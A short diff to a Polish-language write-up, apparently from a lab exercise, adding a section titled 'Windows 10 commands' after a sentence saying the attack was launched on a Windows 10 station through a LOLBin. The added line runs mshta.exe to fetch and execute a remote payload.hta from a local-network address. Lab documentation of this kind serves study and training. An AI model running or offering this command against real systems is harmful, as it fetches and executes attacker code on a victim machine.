@@ -46,3 +46,8 @@ exploit
 <img width="681" height="511" alt="3" src="https://github.com/user-attachments/assets/e3c68df1-297b-4d4e-8ac1-339b8ddde1cb" />
 
 Na stacji Windows 10 uruchomiono atak poprzez wywołanie binarnego LOLBin w wierszu poleceń.
+
+Komendy Windows 10
+```
+mshta.exe http://192.168.0.107/payload.hta
+```
